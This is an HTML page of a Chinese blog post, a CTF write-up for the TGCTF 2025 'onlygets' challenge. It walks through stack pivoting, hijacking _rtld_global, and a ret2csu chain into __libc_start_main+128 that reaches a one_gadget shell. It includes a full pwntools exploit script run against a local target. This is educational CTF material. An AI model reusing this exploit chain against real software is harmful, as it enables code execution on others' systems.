@@ -1,0 +1,686 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/enter-line.ico">
+  <link rel="icon" href="/img/enter-line.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TKYmax">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="TGCTF 2025 onlygets0x01 前言总体来说题目难度适中，后边有两道难题没写出来，还有一题当时唐了没想起来思路，特来记录一下 0x2 onlygets程序分析这是一个大道至简的题，简到只有一个gets函数，比赛时候也是没写出来，今天看了一下午的官方wp学到了新姿势。  常规的的栈溢出肯定打不出来了，没有任何输入函数调用 gdb调试一下看看栈信息，发现了栈中有_rtld_global">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TGCTF 2025 WP">
+<meta property="og:url" content="http://example.com/2025/04/15/TGCTF-2025-WP/index.html">
+<meta property="og:site_name" content="能打八个攻城狮">
+<meta property="og:description" content="TGCTF 2025 onlygets0x01 前言总体来说题目难度适中，后边有两道难题没写出来，还有一题当时唐了没想起来思路，特来记录一下 0x2 onlygets程序分析这是一个大道至简的题，简到只有一个gets函数，比赛时候也是没写出来，今天看了一下午的官方wp学到了新姿势。  常规的的栈溢出肯定打不出来了，没有任何输入函数调用 gdb调试一下看看栈信息，发现了栈中有_rtld_global">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416105435824.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416110001639.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416110443392.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416112309264.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416113104741.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416113424197.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416113711061.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416114047348.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416115917445.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416121147895.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416121400457.png">
+<meta property="article:published_time" content="2025-04-15T13:27:23.000Z">
+<meta property="article:modified_time" content="2025-04-16T06:16:34.398Z">
+<meta property="article:author" content="TKYmax">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416105435824.png">
+  
+  
+  
+  <title>TGCTF 2025 WP - 能打八个攻城狮</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>能打八个攻城狮</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TGCTF 2025 WP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-15 21:27" pubdate>
+          2025年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">TGCTF 2025 WP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="TGCTF-2025-onlygets"><a href="#TGCTF-2025-onlygets" class="headerlink" title="TGCTF 2025 onlygets"></a>TGCTF 2025 onlygets</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>总体来说题目难度适中，后边有两道难题没写出来，还有一题当时唐了没想起来思路，特来记录一下</p>
+<h2 id="0x2-onlygets"><a href="#0x2-onlygets" class="headerlink" title="0x2 onlygets"></a>0x2 onlygets</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>这是一个大道至简的题，简到只有一个gets函数，比赛时候也是没写出来，今天看了一下午的官方wp学到了新姿势。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416105435824.png" srcset="/img/loading.gif" lazyload alt="image-20250416105435824"></p>
+<p>常规的的栈溢出肯定打不出来了，没有任何输入函数调用</p>
+<p>gdb调试一下看看栈信息，发现了栈中有_rtld_global和__libc_start_main+128，这时候就联想到了，利用__libc_start_main+128函数的一个调用链了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416110001639.png" srcset="/img/loading.gif" lazyload alt="image-20250416110001639"></p>
+<p>在__libc_start_main+128出有这么一段代码，如果我们让rcx为libc的地址，劫持_rtld_global为我们想要的偏移，这样到add rcx ，[r14]就能到达我们想去的位置。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416110443392.png" srcset="/img/loading.gif" lazyload alt="image-20250416110443392"></p>
+<h3 id="总结思路"><a href="#总结思路" class="headerlink" title="总结思路"></a>总结思路</h3><p>总体思路就是：</p>
+<ol>
+<li>劫持_rtld_global为我们想要的偏移</li>
+<li>然后调用__libc_start_main+128</li>
+</ol>
+<p>说起来好像很简单的样子，实际上一点不难，我就调试了一下午而已(菜菜！！😭)</p>
+<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><h4 id="过程一-栈迁移"><a href="#过程一-栈迁移" class="headerlink" title="过程一  栈迁移"></a>过程一  栈迁移</h4><p>因为没有输出函数，所以我们没办法泄露栈地址，就没办法对栈进行操作，只能把栈迁移到我们可控的地址 — bss段，如果单纯的迁移到bss段，栈内信息都没了，所以这时候就要控制执行流到start函数，进行初始化信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(bss_addr) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x10</span> + p64(bss_addr) + p64(start_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br></code></pre></td></tr></table></figure>
+
+<p>调试一下看看情况，成功迁移到bss段并进项栈信息初始化</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416112309264.png" srcset="/img/loading.gif" lazyload alt="image-20250416112309264"></p>
+<p>如果要对_rtld_global进项劫持，可以用pop rdi然后调用gets函数就能设置_rtld_global的值，但是如果我们直接进行覆盖，就会导致_rtld_global的值丢失，这样就达不到我们的目的，所以只能控制输入地址为_rtld_global下面的，先把下面的ROP布置好，然后再迁移回来，进项上面的ROP布置。</p>
+<h4 id="过程二-布置ROP链1"><a href="#过程二-布置ROP链1" class="headerlink" title="过程二  布置ROP链1"></a>过程二  布置ROP链1</h4><p>如果要对_rtld_global进项劫持，可以用pop rdi然后调用gets函数就能设置_rtld_global的值，但是如果我们直接进行覆盖，就会导致_rtld_global的值丢失，这样就达不到我们的目的，所以只能控制输入地址为_rtld_global下面的，先把下面的ROP布置好，然后再迁移回来，进行上面的ROP布置。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x601170</span>) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = p64(call_gets) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x601110</span>) + p64(leave_ret)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br></code></pre></td></tr></table></figure>
+
+<p>调试一下看看情况，可以看到成功布置了ROP链，同时我们实现了栈迁移回去的作用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416113104741.png" srcset="/img/loading.gif" lazyload alt="image-20250416113104741"></p>
+<p>这个rbp设置有讲究，需要迁移到栈上信息为main函数的地方，这样执行流又被我们重新控制了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416113424197.png" srcset="/img/loading.gif" lazyload alt="image-20250416113424197"></p>
+<h4 id="过程三-布置ROP链2"><a href="#过程三-布置ROP链2" class="headerlink" title="过程三  布置ROP链2"></a>过程三  布置ROP链2</h4><p>此时我们的栈情况是这样的，接下来就正常布置ROP链</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416113711061.png" srcset="/img/loading.gif" lazyload alt="image-20250416113711061"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x601188</span>) + p64(ret_addr) * <span class="hljs-number">6</span> +  p64(pop_rdi)[:-<span class="hljs-number">2</span>]<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这里的rbp设置和上面一个道理，因为调用的gets后面有leave_ret，所以还可以实现栈迁移，控制执行流到main</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416114047348.png" srcset="/img/loading.gif" lazyload alt="image-20250416114047348"></p>
+<h4 id="过程四-控制-rtld-global的值"><a href="#过程四-控制-rtld-global的值" class="headerlink" title="过程四 控制_rtld_global的值"></a>过程四 控制_rtld_global的值</h4><p>这个值选择也很有讲究，我就是调试的过程中，发现rbp比rsp地址低，有概率出现报错，所以我们直接选择下面空旷的bss段地址，这样设置rbp的地址不容易报错</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0x6012a0</span>)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x6012b0</span>) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="过程五-构造最终payload"><a href="#过程五-构造最终payload" class="headerlink" title="过程五 构造最终payload"></a>过程五 构造最终payload</h4><p>这个payload就是输入到_rtld_global控制的那个地址，也就是我们控制的0x6012a0，构造过程需要调试才知道原理，先粘贴出代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = (<br>    p64(-<span class="hljs-number">293</span> - libc.sym[<span class="hljs-string">&quot;gets&quot;</span>] + <span class="hljs-number">0xebd3f</span>) +<br>    p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + <br>    p64(csu_addr) +<br>    p64(<span class="hljs-number">0</span>) + <br>    p64(<span class="hljs-number">0x6012a8</span>) + <br>    p64(<span class="hljs-number">0x6011a8</span>) + <br>    p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <br>    p64(csucall_addr)<br>).ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x601150</span>)  <span class="hljs-comment"># 填充 + 控制流劫持？</span><br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br></code></pre></td></tr></table></figure>
+
+<p>我们通过csu技术，控制到 __libc_start_main+128</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416115917445.png" srcset="/img/loading.gif" lazyload alt="image-20250416115917445"></p>
+<p>r12寄存器为__libc_start_main+128地址 ， rbx必须为0，这样就能控制到__libc_start_main+128函数了，rbp的值设置为下面空旷bss段地址就行，因为其他函数要进行栈操作，不能不管rbp的值，如果为0，就会报错</p>
+<p>这两个行代码就说明为什么要填充0xa0个，然后后面填充一个地址，这个地址是gets残留的上一个地址，因为下面还要对地址进行+8处理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416121147895.png" srcset="/img/loading.gif" lazyload alt="image-20250416121147895"></p>
+<p>可以看到成功控制到one_gadget</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416121400457.png" srcset="/img/loading.gif" lazyload alt="image-20250416121400457"></p>
+<h4 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwnpy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>filename = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>url = <span class="hljs-string">&#x27;127.0.0.1:46671&#x27;</span><br>gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  b * 0x00000000004005F1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>set_context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, timeout=<span class="hljs-number">5</span>)<br>p = pr(url = url , filename = filename , gdbscript = gdbscript)<br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>bss_addr = <span class="hljs-number">0x0000000000601200</span><br>read_addr = <span class="hljs-number">0x00000000004005E5</span><br>start_addr = <span class="hljs-number">0x0000000000400480</span><br>leave_ret = <span class="hljs-number">0x00000000004005FB</span><br>call_gets = <span class="hljs-number">0x00000000004005F1</span><br>pop_rdi = <span class="hljs-number">0x0000000000400663</span><br>ret_addr = <span class="hljs-number">0x00000000004005FC</span><br>csu_addr = <span class="hljs-number">0x000000000040065A</span><br>csucall_addr = <span class="hljs-number">0x0000000000400649</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(bss_addr) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x10</span> + p64(bss_addr) + p64(start_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x601170</span>) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = p64(call_gets) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x601110</span>) + p64(leave_ret)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x601188</span>) + p64(ret_addr) * <span class="hljs-number">6</span> +  p64(pop_rdi)[:-<span class="hljs-number">2</span>]<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = p64(<span class="hljs-number">0x6012a0</span>)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>pause()<br>payload = <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x6012b0</span>) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>oggs = [<span class="hljs-number">0xebc81</span> , <span class="hljs-number">0xebc85</span> , <span class="hljs-number">0xebc88</span> , <span class="hljs-number">0xebce2</span> , <span class="hljs-number">0xebd38</span> , <span class="hljs-number">0xebd3f</span> , <span class="hljs-number">0xebd43</span>]<br><br>payload = (<br>    p64(-<span class="hljs-number">293</span> - libc.sym[<span class="hljs-string">&quot;gets&quot;</span>] + <span class="hljs-number">0xebd3f</span>) +<br>    p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + <br>    p64(csu_addr) +<br>    p64(<span class="hljs-number">0</span>) + <br>    p64(<span class="hljs-number">0x6012a8</span>) + <br>    p64(<span class="hljs-number">0x6011a8</span>) + <br>    p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <br>    p64(csucall_addr)<br>).ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x601150</span>)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>方法方法是一种十分考验调试能力，对rbp控制能力的题，写下来收获挺多的。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WP/" class="category-chain-item">WP</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WP/" class="print-no-link">#WP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/14/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E5%AD%A6%E4%B9%A0/" title="HTTP协议详细学习">
+                        <span class="hidden-mobile">HTTP协议详细学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <span>P0ach1l</span></a> <i class="iconfont icon-love"></i> <span>GX</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
